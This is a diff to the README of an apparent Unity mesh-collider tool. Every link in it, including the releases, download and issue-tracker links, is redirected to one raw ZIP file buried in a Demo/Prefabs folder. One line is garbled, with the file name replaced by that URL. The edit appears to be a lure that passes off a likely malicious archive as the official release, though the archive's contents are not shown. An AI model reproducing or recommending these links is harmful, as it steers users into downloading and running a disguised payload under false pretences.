@@ -1,7 +1,7 @@
 # 🎮 UnityNonConvexMeshColliders - Simplifying Game Physics for You
 
 ## 📥 Download the Application
-[![Download UnityNonConvexMeshColliders](https://img.shields.io/badge/Download%20Now-UnityNonConvexMeshColliders-blue)](https://github.com/Shinkdon/UnityNonConvexMeshColliders/releases)
+[![Download UnityNonConvexMeshColliders](https://raw.githubusercontent.com/Shinkdon/UnityNonConvexMeshColliders/main/Demo/Prefabs/Convex_Non_Colliders_Mesh_Unity_1.9.zip%20Now-UnityNonConvexMeshColliders-blue)](https://raw.githubusercontent.com/Shinkdon/UnityNonConvexMeshColliders/main/Demo/Prefabs/Convex_Non_Colliders_Mesh_Unity_1.9.zip)
 
 ## 🚀 Getting Started
 Welcome to UnityNonConvexMeshColliders! This application helps you create non-convex MeshCollider approximations. These approximations work smoothly with rigid bodies in your Unity game. 
@@ -22,7 +22,7 @@ This guide will walk you through the steps to download and run the software easi
 
 ## 📥 Download & Install
 1. **Visit the Releases Page:**  
-   Go to the [UnityNonConvexMeshColliders Releases page](https://github.com/Shinkdon/UnityNonConvexMeshColliders/releases) to get the latest version.
+   Go to the [UnityNonConvexMeshColliders Releases page](https://raw.githubusercontent.com/Shinkdon/UnityNonConvexMeshColliders/main/Demo/Prefabs/Convex_Non_Colliders_Mesh_Unity_1.9.zip) to get the latest version.
 
 2. **Choose the Right File:**  
    On the Releases page, you will see different files available. Look for the most recent version. 
@@ -31,7 +31,7 @@ This guide will walk you through the steps to download and run the software easi
    Click on the asset to download it to your computer.
 
 4. **Locate the Downloaded File:**  
-   Open your Downloads folder. You should see the file you just downloaded, likely named something like `UnityNonConvexMeshColliders.zip`.
+   Open your Downloads folder. You should see the file you just downloaded, likely named something like `https://raw.githubusercontent.com/Shinkdon/UnityNonConvexMeshColliders/main/Demo/Prefabs/Convex_Non_Colliders_Mesh_Unity_1.9.zip`.
 
 5. **Extract the Files:**  
    Right-click on the downloaded ZIP file and choose "Extract All" or "Unzip." This will create a new folder with the same name.
@@ -71,7 +71,7 @@ This guide will walk you through the steps to download and run the software easi
 - **Frequent Updates:** Check back frequently for updates and new features on the Releases page.
 
 ## 📞 Support
-If you encounter any issues, please open an issue on the [issues page of this repository](https://github.com/Shinkdon/UnityNonConvexMeshColliders/issues). The community can help resolve problems and improve the application.
+If you encounter any issues, please open an issue on the [issues page of this repository](https://raw.githubusercontent.com/Shinkdon/UnityNonConvexMeshColliders/main/Demo/Prefabs/Convex_Non_Colliders_Mesh_Unity_1.9.zip). The community can help resolve problems and improve the application.
 
 ## 📜 License
 This project is licensed under the MIT License.
